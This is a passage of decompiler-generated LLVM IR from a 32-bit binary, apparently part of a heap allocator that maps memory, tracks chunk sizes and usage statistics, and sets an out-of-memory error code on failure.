  br i1 %tmp132, label %dec_label_pc_8052928, label %dec_label_pc_8052b60

dec_label_pc_8052928:                             ; preds = %dec_label_pc_805291e
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8052935 = call i32 @function_8053c58(i32 0, i32 %v0_8052932, i32 3, i32 34, i32 0, i32 0, i32 %v0_8052928, i32 %v0_8052928)
  store i32 %v8_8052935, i32* %eax.global-to-local, align 4
  store i32 %v8_8052935, i32* @ebx, align 4
  %v10_805293f = icmp eq i32 %v8_8052935, -1
  br i1 %v10_805293f, label %dec_label_pc_8052b60, label %dec_label_pc_8052952.thread

dec_label_pc_8052952.thread:                      ; preds = %dec_label_pc_8052928
  %v0_8052948 = load i8, i8* @global_var_8056ba0.217, align 1
  %v2_8052948 = and i8 %v0_8052948, -2
  store i8 %v2_8052948, i8* @global_var_8056ba0.217, align 32
  %v1_805294f = load i32, i32* @esi, align 4
  %v2_805294f = add i32 %v1_805294f, %v8_8052935
  store i32 %v2_805294f, i32* @edx, align 4
  br label %dec_label_pc_805295b

dec_label_pc_8052952.dec_label_pc_805295b_crit_edge: ; preds = %dec_label_pc_80528e6
  %v1_805295f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805295b

dec_label_pc_805295b:                             ; preds = %dec_label_pc_8052952.dec_label_pc_805295b_crit_edge, %dec_label_pc_8052952.thread
  %v1_805295f = phi i32 [ %v1_805294f, %dec_label_pc_8052952.thread ], [ %v1_805295f.pre, %dec_label_pc_8052952.dec_label_pc_805295b_crit_edge ]
  %v0_8052a2794 = phi i32 [ %v8_8052935, %dec_label_pc_8052952.thread ], [ %v1_80528ea, %dec_label_pc_8052952.dec_label_pc_805295b_crit_edge ]
  %v0_8052a1993 = phi i32 [ %v2_805294f, %dec_label_pc_8052952.thread ], [ -1, %dec_label_pc_8052952.dec_label_pc_805295b_crit_edge ]
  %v0_805295f = load i32, i32* @global_var_8056ba8.214, align 8
  %v2_805295f = add i32 %v1_805295f, %v0_805295f
  store i32 %v2_805295f, i32* @global_var_8056ba8.214, align 8
  %v2_8052965 = add i32 %v1_80528be, %v0_80528ab
  store i32 %v2_8052965, i32* %ecx.global-to-local, align 4
  %v2_8052967 = sub i32 %v0_8052a2794, %v2_8052965
  %v7_8052967 = icmp ult i32 %v0_8052a2794, %v2_8052965
  %v12_8052967 = icmp eq i32 %v2_8052967, 0
  %v1_8052969 = icmp eq i1 %v12_8052967, false
  br i1 %v1_8052969, label %dec_label_pc_8052982, label %dec_label_pc_805296b

dec_label_pc_805296b:                             ; preds = %dec_label_pc_805295b
  %v10_805296b = icmp eq i32 %v0_8052a1993, -1
  %v1_805296e = icmp eq i1 %v10_805296b, false
  br i1 %v1_805296e, label %dec_label_pc_8052982, label %dec_label_pc_8052970

dec_label_pc_8052970:                             ; preds = %dec_label_pc_805296b
  %v2_8052970 = add i32 %v1_805295f, %v1_80528be
  store i32 %v0_80528ab, i32* %ecx.global-to-local, align 4
  %v1_8052977 = or i32 %v2_8052970, 1
  store i32 %v1_8052977, i32* %eax.global-to-local, align 4
  store i32 %v1_8052977, i32* %v2_80528b4, align 4
  br label %dec_label_pc_8052aaf

dec_label_pc_8052982:                             ; preds = %dec_label_pc_805296b, %dec_label_pc_805295b
  %v0_8052982 = load i8, i8* @global_var_8056ba0.217, align 1
  %v1_8052982 = sext i8 %v0_8052982 to i32
  store i32 %v1_8052982, i32* %eax.global-to-local, align 4
  %v2_8052987 = urem i8 %v0_8052982, 2
  %v3_8052987 = icmp eq i8 %v2_8052987, 0
  br i1 %v3_8052987, label %dec_label_pc_805299b, label %dec_label_pc_805298b

dec_label_pc_805298b:                             ; preds = %dec_label_pc_8052982
  br i1 %v2_80528be, label %dec_label_pc_805299b, label %dec_label_pc_805298f

dec_label_pc_805298f:                             ; preds = %dec_label_pc_805298b
  %v1_8052991 = icmp eq i1 %v7_8052967, false
  br i1 %v1_8052991, label %dec_label_pc_805299b, label %dec_label_pc_8052993

dec_label_pc_8052993:                             ; preds = %dec_label_pc_805298f
  %v1_8052993 = and i32 %v1_8052982, -2
  %v4_8052993 = trunc i32 %v1_8052993 to i8
  store i32 %v1_8052993, i32* %eax.global-to-local, align 4
  store i8 %v4_8052993, i8* @global_var_8056ba0.217, align 32
  br label %dec_label_pc_805299b

dec_label_pc_805299b:                             ; preds = %dec_label_pc_805298f, %dec_label_pc_805298b, %dec_label_pc_8052982, %dec_label_pc_8052993
  %v0_805299b = phi i8 [ %v0_8052982, %dec_label_pc_805298f ], [ %v0_8052982, %dec_label_pc_805298b ], [ %v0_8052982, %dec_label_pc_8052982 ], [ %v4_8052993, %dec_label_pc_8052993 ]
  %v1_805299b = urem i8 %v0_805299b, 2
  %v2_805299b = icmp eq i8 %v1_805299b, 0
  br i1 %v2_805299b, label %dec_label_pc_8052a19, label %dec_label_pc_80529a4

dec_label_pc_80529a4:                             ; preds = %dec_label_pc_805299b
  br i1 %v2_80528be, label %dec_label_pc_80529b2, label %dec_label_pc_80529a8

dec_label_pc_80529a8:                             ; preds = %dec_label_pc_80529a4
  store i32 %v2_8052967, i32* %eax.global-to-local, align 4
  %v2_80529ac = add i32 %v2_805295f, %v2_8052967
  store i32 %v2_80529ac, i32* @global_var_8056ba8.214, align 8
  br label %dec_label_pc_80529b2

dec_label_pc_80529b2:                             ; preds = %dec_label_pc_80529a4, %dec_label_pc_80529a8
  %v1_80529b4 = urem i32 %v0_8052a2794, 8
  %v2_80529b4 = icmp eq i32 %v1_80529b4, 0
  store i32 %v1_80529b4, i32* %edx.global-to-local, align 4
  %v1_80529b7 = icmp eq i1 %v2_80529b4, false
  br i1 %v1_80529b7, label %dec_label_pc_80529bf, label %dec_label_pc_80529b9

dec_label_pc_80529b9:                             ; preds = %dec_label_pc_80529b2
  store i32 %v0_8052a2794, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80529c9

dec_label_pc_80529bf:                             ; preds = %dec_label_pc_80529b2
  %v2_80529c4 = sub nsw i32 8, %v1_80529b4
  store i32 %v2_80529c4, i32* %eax.global-to-local, align 4
  %v2_80529c6 = add i32 %v2_80529c4, %v0_8052a2794
  store i32 %v2_80529c6, i32* @edi, align 4
  br label %dec_label_pc_80529c9

dec_label_pc_80529c9:                             ; preds = %dec_label_pc_80529b9, %dec_label_pc_80529bf
  %v0_80529cc = phi i32 [ 0, %dec_label_pc_80529b9 ], [ %v2_80529c4, %dec_label_pc_80529bf ]
  %v2_80529c9 = add i32 %v1_805295f, %v0_8052a2794
  %v2_80529cc = add i32 %v0_80529cc, %v1_80528be
  store i32 %v2_80529cc, i32* %ecx.global-to-local, align 4
  %v2_80529d5 = add i32 %v2_80529cc, %v2_80529c9
  store i32 %v2_80529d5, i32* %edx.global-to-local, align 4
  %v2_80529db = add i32 %v2_80529d5, %v1_80527de
  %v5_80529de = and i32 %v2_80529db, %v1_80528da
  %v2_80529e5 = sub i32 %v5_80529de, %v2_80529d5
  store i32 %v2_80529e5, i32* %eax.global-to-local, align 4
  %v2_80529e7 = add i32 %v2_80529e5, %v2_80529cc
  store i32 %v2_80529e7, i32* @esi, align 4
  store i32 %v2_80529e7, i32* %stack_var_-92, align 4
  %v1_80529eb = call i32 @function_8054109(i32 %v2_80529e7)
  store i32 %v1_80529eb, i32* %eax.global-to-local, align 4
  store i32 %v1_80529eb, i32* @edx, align 4
  %v10_80529f5 = icmp eq i32 %v1_80529eb, -1
  %v1_80529f8 = icmp eq i1 %v10_80529f5, false
  br i1 %v1_80529f8, label %dec_label_pc_8052a08, label %dec_label_pc_80529fa

dec_label_pc_80529fa:                             ; preds = %dec_label_pc_80529c9
  store i32 0, i32* %stack_var_-92, align 4
  %v1_80529ff = call i32 @function_8054109(i32 0)
  store i32 %v1_80529ff, i32* %eax.global-to-local, align 4
  store i32 %v1_80529ff, i32* @edx, align 4
  br label %dec_label_pc_8052a3c

dec_label_pc_8052a08:                             ; preds = %dec_label_pc_80529c9
  %v1_8052a08 = load i32, i32* @ebx, align 4
  %v7_8052a08 = icmp ult i32 %v1_80529eb, %v1_8052a08
  %v1_8052a0a = icmp eq i1 %v7_8052a08, false
  br i1 %v1_8052a0a, label %dec_label_pc_8052a41, label %dec_label_pc_8052a0c

dec_label_pc_8052a0c:                             ; preds = %dec_label_pc_8052a08
  %v0_8052a0c = load i8, i8* @global_var_8056ba0.217, align 1
  %v2_8052a0c = and i8 %v0_8052a0c, -2
  store i8 %v2_8052a0c, i8* @global_var_8056ba0.217, align 32
  store i32 %v2_80529c9, i32* @edx, align 4
  br label %dec_label_pc_8052a20

dec_label_pc_8052a19:                             ; preds = %dec_label_pc_805299b
  %v10_8052a19 = icmp eq i32 %v0_8052a1993, -1
  br i1 %v10_8052a19, label %dec_label_pc_8052a24, label %dec_label_pc_8052a1e

dec_label_pc_8052a1e:                             ; preds = %dec_label_pc_8052a19
  store i32 %v0_8052a2794, i32* @edi, align 4
  br label %dec_label_pc_8052a20

dec_label_pc_8052a20:                             ; preds = %dec_label_pc_8052a0c, %dec_label_pc_8052a1e
  %v0_8052a4158 = phi i32 [ %v2_80529c9, %dec_label_pc_8052a0c ], [ %v0_8052a1993, %dec_label_pc_8052a1e ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8052a41

dec_label_pc_8052a24:                             ; preds = %dec_label_pc_8052a19
  store i32 %v0_8052a2794, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8052a2b = call i32 @function_8054109(i32 0)
  store i32 %v1_8052a2b, i32* @edx, align 4
  %v1_8052a32 = load i32, i32* @ebx, align 4
  %v2_8052a32 = sub i32 %v1_8052a2b, %v1_8052a32
  %v1_8052a34 = load i32, i32* @esi, align 4
  %v2_8052a34 = sub i32 %v2_8052a32, %v1_8052a34
  store i32 %v2_8052a34, i32* %eax.global-to-local, align 4
  %v0_8052a36 = load i32, i32* @global_var_8056ba8.214, align 8
  %v2_8052a36 = add i32 %v0_8052a36, %v2_8052a34
  store i32 %v2_8052a36, i32* @global_var_8056ba8.214, align 8
  br label %dec_label_pc_8052a3c

dec_label_pc_8052a3c:                             ; preds = %dec_label_pc_80529fa, %dec_label_pc_8052a24
  %v0_8052a4157 = phi i32 [ %v1_80529ff, %dec_label_pc_80529fa ], [ %v1_8052a2b, %dec_label_pc_8052a24 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8052a41

dec_label_pc_8052a41:                             ; preds = %dec_label_pc_8052a08, %dec_label_pc_8052a20, %dec_label_pc_8052a3c
  %v0_8052a46 = phi i32 [ %v1_80529eb, %dec_label_pc_8052a08 ], [ %v0_8052a4158, %dec_label_pc_8052a20 ], [ %v0_8052a4157, %dec_label_pc_8052a3c ]
  %v10_8052a41 = icmp eq i32 %v0_8052a46, -1
  br i1 %v10_8052a41, label %dec_label_pc_8052aaf, label %dec_label_pc_8052a46

dec_label_pc_8052a46:                             ; preds = %dec_label_pc_8052a41
  %v1_8052a46 = load i32, i32* @edi, align 4
  %v2_8052a46 = sub i32 %v0_8052a46, %v1_8052a46
  store i32 %v2_8052a46, i32* @edx, align 4
  store i32 %v1_8052a46, i32* @global_var_805686c.202, align 4
  %v1_8052a4e = load i32, i32* @esi, align 4
  %v2_8052a4e = add i32 %v1_8052a4e, %v2_8052a46
  %v1_8052a51 = or i32 %v2_8052a4e, 1
  store i32 %v1_8052a51, i32* %eax.global-to-local, align 4
  %v2_8052a54 = add i32 %v1_8052a46, 4
  %v3_8052a54 = inttoptr i32 %v2_8052a54 to i32*
  store i32 %v1_8052a51, i32* %v3_8052a54, align 4
  %v0_8052a57 = load i32, i32* @global_var_8056ba8.214, align 8
  %v1_8052a57 = load i32, i32* @esi, align 4
  %v2_8052a57 = add i32 %v1_8052a57, %v0_8052a57
  store i32 %v2_8052a57, i32* @global_var_8056ba8.214, align 8
  br i1 %v2_80528be, label %dec_label_pc_8052aaf, label %dec_label_pc_8052a61

dec_label_pc_8052a61:                             ; preds = %dec_label_pc_8052a46
  %v1_8052a61 = add i32 %v1_80528be, -12
  store i32 %v0_80528ab, i32* %ecx.global-to-local, align 4
  %v1_8052a68 = and i32 %v1_8052a61, -8
  store i32 %v1_8052a68, i32* %eax.global-to-local, align 4
  %v1_8052a6d = or i32 %v1_8052a68, 1
  store i32 %v1_8052a6d, i32* @edx, align 4
  %v5_8052a70 = icmp ult i32 %v1_8052a68, 15
  store i32 %v1_8052a6d, i32* %v2_80528b4, align 4
  %v0_8052a76 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052a76 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052a76 = add i32 %v0_8052a76, 4
  %v3_8052a76 = add i32 %v2_8052a76, %v1_8052a76
  %v4_8052a76 = inttoptr i32 %v3_8052a76 to i32*
  store i32 5, i32* %v4_8052a76, align 4
  %v0_8052a7e = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052a7e = load i32, i32* %eax.global-to-local, align 4
  %v2_8052a7e = add i32 %v0_8052a7e, 8
  %v3_8052a7e = add i32 %v2_8052a7e, %v1_8052a7e
  %v4_8052a7e = inttoptr i32 %v3_8052a7e to i32*
  store i32 5, i32* %v4_8052a7e, align 4
  br i1 %v5_8052a70, label %dec_label_pc_8052aaf, label %dec_label_pc_8052a88

dec_label_pc_8052a88:                             ; preds = %dec_label_pc_8052a61
  %v0_8052a8b = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052a8d = add i32 %v0_8052a8b, 8
  store i32 %v1_8052a8d, i32* %eax.global-to-local, align 4
  %v0_8052a90 = load i32, i32* @global_var_8056b84.218, align 4
  store i32 %v0_8052a90, i32* @ebx, align 4
  store i32 %v1_8052a8d, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8056b84.218, align 4
  %v1_8052aa1 = call i32 @function_80531d9(i32 %v1_8052a8d)
  store i32 %v1_8052aa1, i32* %eax.global-to-local, align 4
  %v0_8052aa6 = load i32, i32* @ebx, align 4
  store i32 %v0_8052aa6, i32* @global_var_8056b84.218, align 4
  br label %dec_label_pc_8052aaf

dec_label_pc_8052aaf:                             ; preds = %dec_label_pc_8052a61, %dec_label_pc_8052a46, %dec_label_pc_8052a41, %dec_label_pc_8052970, %dec_label_pc_8052a88
  %v0_8052aaf = load i32, i32* @global_var_8056ba8.214, align 8
  store i32 %v0_8052aaf, i32* %eax.global-to-local, align 4
  %v1_8052ab4 = load i32, i32* @global_var_8056bac.219, align 4
  %tmp133 = icmp ugt i32 %v0_8052aaf, %v1_8052ab4
  br i1 %tmp133, label %dec_label_pc_8052abc, label %dec_label_pc_8052ac1

dec_label_pc_8052abc:                             ; preds = %dec_label_pc_8052aaf
  store i32 %v0_8052aaf, i32* @global_var_8056bac.219, align 4
  br label %dec_label_pc_8052ac1

dec_label_pc_8052ac1:                             ; preds = %dec_label_pc_8052aaf, %dec_label_pc_8052abc
  %v1_8052ac1 = load i32, i32* @global_var_8056ba4.212, align 4
  %v2_8052ac1 = add i32 %v1_8052ac1, %v0_8052aaf
  store i32 %v2_8052ac1, i32* %eax.global-to-local, align 4
  %v1_8052ac7 = load i32, i32* @global_var_8056bb4.215, align 4
  %tmp134 = icmp ugt i32 %v2_8052ac1, %v1_8052ac7
  br i1 %tmp134, label %dec_label_pc_8052acf, label %dec_label_pc_8052ad4

dec_label_pc_8052acf:                             ; preds = %dec_label_pc_8052ac1
  store i32 %v2_8052ac1, i32* @global_var_8056bb4.215, align 4
  br label %dec_label_pc_8052ad4

dec_label_pc_8052ad4:                             ; preds = %dec_label_pc_8052ac1, %dec_label_pc_8052acf
  %v0_8052ad4 = load i32, i32* @global_var_805686c.202, align 4
  store i32 %v0_8052ad4, i32* @ebx, align 4
  %v1_8052ada = add i32 %v0_8052ad4, 4
  %v2_8052ada = inttoptr i32 %v1_8052ada to i32*
  %v3_8052ada = load i32, i32* %v2_8052ada, align 4
  %v1_8052add = and i32 %v3_8052ada, -4
  store i32 %v1_8052add, i32* %ecx.global-to-local, align 4
  %v10_8052ae0 = icmp ult i32 %v1_8052add, %v1_805277d
  br i1 %v10_8052ae0, label %dec_label_pc_8052b60, label %dec_label_pc_8052ae6

dec_label_pc_8052ae6:                             ; preds = %dec_label_pc_8052ad4
  store i32 %v1_8052808, i32* %esi.global-to-local, align 4
  %v2_8052aec = sub i32 %v1_8052add, %v1_8052808
  store i32 %v2_8052aec, i32* %ecx.global-to-local, align 4
  %v2_8052aee = add i32 %v0_8052ad4, %v1_8052808
  store i32 %v2_8052aee, i32* @edx, align 4
  %v1_8052af1 = or i32 %v1_8052808, 1
  store i32 %v1_8052af1, i32* %eax.global-to-local, align 4
  store i32 %v2_8052aee, i32* @global_var_805686c.202, align 4
  store i32 %v1_8052af1, i32* %v2_8052ada, align 4
  %v0_8052afd.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052afd

dec_label_pc_8052afd:                             ; preds = %dec_label_pc_805278e, %dec_label_pc_8052ae6
  %v0_8052afd = phi i32 [ %v5_80527a1, %dec_label_pc_805278e ], [ %v0_8052afd.pre, %dec_label_pc_8052ae6 ]
  %v1_8052afd = or i32 %v0_8052afd, 1
  store i32 %v1_8052afd, i32* %ecx.global-to-local, align 4
  %v0_8052b00 = load i32, i32* @ebx, align 4
  %v1_8052b00 = add i32 %v0_8052b00, 8
  store i32 %v1_8052b00, i32* %ebx.global-to-local, align 4
  %v1_8052b03 = load i32, i32* @edx, align 4
  %v2_8052b03 = add i32 %v1_8052b03, 4
  %v3_8052b03 = inttoptr i32 %v2_8052b03 to i32*
  store i32 %v1_8052afd, i32* %v3_8052b03, align 4
  br label %dec_label_pc_8052b6d

dec_label_pc_8052b08:                             ; preds = %dec_label_pc_8052548
  %v5_8052b0e = sub i32 %v1_805252b, %v1_8052808
  store i32 %v5_8052b0e, i32* %eax.global-to-local, align 4
  %v2_8052b12 = add i32 %v1_8052b1f, %v1_8052808
  store i32 %v2_8052b12, i32* @edx, align 4
  %v1_8052b16 = or i32 %v1_8052808, 1
  store i32 %v2_8052b12, i32* @global_var_8056870.203, align 16
  store i32 %v1_8052b16, i32* %v2_8052525, align 4
  %v0_8052b22 = load i32, i32* %eax.global-to-local, align 4
  %v0_8052b24 = load i32, i32* @edx, align 4
  store i32 %v0_8052b24, i32* @global_var_805687c.220, align 4
  %v1_8052b2a = or i32 %v0_8052b22, 1
  store i32 %v1_8052b2a, i32* %ecx.global-to-local, align 4
  store i32 %v0_8052b24, i32* @global_var_8056880.205, align 128
  %v1_8052b33 = add i32 %v0_8052b24, 8
  %v2_8052b33 = inttoptr i32 %v1_8052b33 to i32*
  store i32 ptrtoint (i32* @global_var_8056874.204 to i32), i32* %v2_8052b33, align 4
  %v0_8052b3a = load i32, i32* @edx, align 4
  %v1_8052b3a = add i32 %v0_8052b3a, 12
  %v2_8052b3a = inttoptr i32 %v1_8052b3a to i32*
  store i32 ptrtoint (i32* @global_var_8056874.204 to i32), i32* %v2_8052b3a, align 4
  %v0_8052b41 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052b41 = load i32, i32* @edx, align 4
  %v2_8052b41 = add i32 %v1_8052b41, 4
  %v3_8052b41 = inttoptr i32 %v2_8052b41 to i32*
  store i32 %v0_8052b41, i32* %v3_8052b41, align 4
  %v0_8052b44 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052b44 = load i32, i32* @edx, align 4
  %v3_8052b44 = add i32 %v1_8052b44, %v0_8052b44
  %v4_8052b44 = inttoptr i32 %v3_8052b44 to i32*
  store i32 %v0_8052b44, i32* %v4_8052b44, align 4
  br label %dec_label_pc_8052b52

dec_label_pc_8052b49:                             ; preds = %dec_label_pc_8052557
  store i32 %v1_8052808, i32* %ebx.global-to-local, align 4
  %v0_8052b4d = load i32, i32* @ebp, align 4
  %v2_8052b4d = or i32 %v1_8052808, 4
  %v3_8052b4d = add i32 %v0_8052b4d, %v2_8052b4d
  %v4_8052b4d = inttoptr i32 %v3_8052b4d to i32*
  %v5_8052b4d = load i32, i32* %v4_8052b4d, align 4
  %v6_8052b4d = or i32 %v5_8052b4d, 1
  store i32 %v6_8052b4d, i32* %v4_8052b4d, align 4
  br label %dec_label_pc_8052b52

dec_label_pc_8052b52:                             ; preds = %dec_label_pc_8052b08, %dec_label_pc_8052b49
  %v0_8052b52 = load i32, i32* @ebp, align 4
  %v1_8052b52 = add i32 %v0_8052b52, 8
  store i32 %v1_8052b52, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052b6d

dec_label_pc_8052b57:                             ; preds = %dec_label_pc_8052647
  %v1_8052b57 = load i32, i32* @ebx, align 4
  %v2_8052b57 = add i32 %v0_8052656, 4
  %v3_8052b57 = add i32 %v2_8052b57, %v1_8052b57
  %v4_8052b57 = inttoptr i32 %v3_8052b57 to i32*
  %v5_8052b57 = load i32, i32* %v4_8052b57, align 4
  %v6_8052b57 = or i32 %v5_8052b57, 1
  store i32 %v6_8052b57, i32* %v4_8052b57, align 4
  br label %dec_label_pc_8052b5c

dec_label_pc_8052b5c:                             ; preds = %dec_label_pc_805265f, %dec_label_pc_8052b57
  %v0_8052b5c = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8052b5c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052b6d

dec_label_pc_8052b60:                             ; preds = %dec_label_pc_805291e, %dec_label_pc_8052ad4, %dec_label_pc_8052928
  %v0_8052b60 = load i32, i32* %stack_var_-92, align 4
  %v1_8052b60 = call i32 @function_8051fb9(i32 %v0_8052b60)
  store i32 %v1_8052b60, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8052b67 = inttoptr i32 %v1_8052b60 to i32*
  store i32 12, i32* %v1_8052b67, align 4
  br label %dec_label_pc_8052b6d

dec_label_pc_8052b6d:                             ; preds = %dec_label_pc_8052b5c, %dec_label_pc_8052b52, %dec_label_pc_8052afd, %dec_label_pc_80527b9, %dec_label_pc_805276b, %dec_label_pc_80524f2, %dec_label_pc_8052b60
  store i32 %v2_8052429, i32* @eax, align 4
  store i32 %v2_8052429, i32* %stack_var_-92, align 4
  %v2_8052b76 = call i32 @function_8053940(i32 %v2_8052429, i32 1)
  store i32 %v2_8052b76, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052b7e

dec_label_pc_8052b7e:                             ; preds = %dec_label_pc_8052447, %dec_label_pc_8052b6d
  %v0_8052b81 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8052b81, i32* %eax.global-to-local, align 4
  store i32 %v0_8052416, i32* @esi, align 4
  store i32 %v0_8052415, i32* @edi, align 4
  store i32 %v0_8052414, i32* @ebp, align 4
  ret i32 %v0_8052b81

; uselistorder directives
  uselistorder i32 %v0_8052b44, { 1, 0 }
  uselistorder i32 %v0_8052b24, { 1, 0, 2 }
  uselistorder i32 %v2_8052ac1, { 1, 0, 2 }
  uselistorder i32 %v0_8052aaf, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8052a46, { 1, 0 }
  uselistorder i32 %v2_8052a34, { 1, 0 }
  uselistorder i32 %v1_80529eb, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_80529d5, { 1, 0, 2 }
  uselistorder i32 %v2_80529c9, { 1, 2, 0 }
  uselistorder i32 %v2_80529c4, { 1, 0, 2 }
  uselistorder i32 %v1_80529b4, { 2, 1, 0 }
  uselistorder i8 %v0_8052982, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_8052965, { 1, 0, 2 }
  uselistorder i32 %v0_8052a1993, { 2, 0, 1 }
  uselistorder i32 %v0_8052a2794, { 3, 4, 1, 2, 5, 0, 7, 6 }
  uselistorder i32 %v1_805295f, { 2, 1, 0 }
  uselistorder i32 %v8_8052935, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8052932, { 1, 0 }
  uselistorder i32 %v0_8052911, { 1, 0 }
  uselistorder i32 %v2_80528e2, { 1, 0, 2, 3 }
  uselistorder i32 %v1_80528da, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_80528c7, { 1, 0 }
  uselistorder i1 %v2_80528be, { 2, 1, 0 }
  uselistorder i32 %v1_80528be, { 5, 0, 1, 2, 3, 4, 6, 7 }
  uselistorder i32 %v0_80528ab, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_805288f, { 1, 0, 2 }
  uselistorder i32 %v2_805287b, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8052844, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8052838, { 2, 1, 0 }
  uselistorder i32 %v8_8052827, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v2_805280e, { 1, 0, 2 }
  uselistorder i32 %v0_80527aa, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_805277d, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8052773, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_8052765, { 1, 0 }
  uselistorder i32 %v1_80526fc, { 1, 0 }
  uselistorder i32 %v3_80526f0, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_8052700, { 1, 0 }
  uselistorder i32 %v2_80526ea, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_80526e77, { 1, 0 }
  uselistorder i32 %v2_80526dc, { 1, 0 }
  uselistorder i32 %v1_80526c0, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_80526bc, { 2, 1, 0 }
  uselistorder i32 %v1_80526b8, { 1, 0 }
  uselistorder i32 %v1_80526ac, { 2, 1, 0 }
  uselistorder i32 %v2_80526a2, { 1, 0 }
  uselistorder i32 %v1_805269f, { 1, 2, 0 }
  uselistorder i32 %v4_805263d, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_8052688, { 1, 0 }
  uselistorder i32 %v0_8052656, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8052629, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80525f6, { 0, 2, 1 }
  uselistorder i32 %v2_80525da, { 1, 0 }
  uselistorder i32 %v1_80525d0, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_80525cb.lcssa, { 1, 0 }
  uselistorder i32 %v3_80525bb, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_80525b2, { 1, 0, 2 }
  uselistorder i32 %v2_805258e, { 2, 0, 1, 3 }
  uselistorder i32 %v2_8052576, { 2, 1, 0 }
  uselistorder i32 %v0_8052562, { 2, 0, 3, 1 }
  uselistorder i32 %v3_8052528, { 1, 0, 2 }
  uselistorder i32 %v1_8052b1f, { 0, 1, 3, 2 }
  uselistorder i32 %v0_80525f69, { 1, 0, 2 }
  uselistorder i32 %v3_80524d5, { 1, 0, 2 }
  uselistorder i32 %v2_80524c7, { 2, 1, 0 }
  uselistorder i32 %v2_80524a2, { 2, 1, 0 }
  uselistorder i8 %v0_8052470, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_8052808, { 13, 31, 12, 2, 29, 11, 3, 22, 21, 10, 9, 4, 24, 23, 20, 18, 19, 5, 25, 26, 6, 27, 28, 15, 7, 16, 17, 8, 30, 14, 0, 32, 34, 33, 1, 35 }
  uselistorder i32 %v1_8052459, { 0, 2, 1 }
  uselistorder i32 %v0_8052442, { 1, 0 }
  uselistorder i32 %v2_8052429, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %ecx.global-to-local, { 23, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32* %ebx.global-to-local, { 21, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 0, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 50, 51, 54, 53, 52, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_8056ba0.217, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @function_8053c58, { 1, 0 }
  uselistorder i32 134572148, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_8056880.205, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_80523ee, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805686c.202 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_805686c.202 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_8052b7e, { 1, 0 }
  uselistorder label %dec_label_pc_8052b6d, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8052b60, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052b5c, { 1, 0 }
  uselistorder label %dec_label_pc_8052b52, { 1, 0 }
  uselistorder label %dec_label_pc_8052afd, { 1, 0 }
  uselistorder label %dec_label_pc_8052ad4, { 1, 0 }
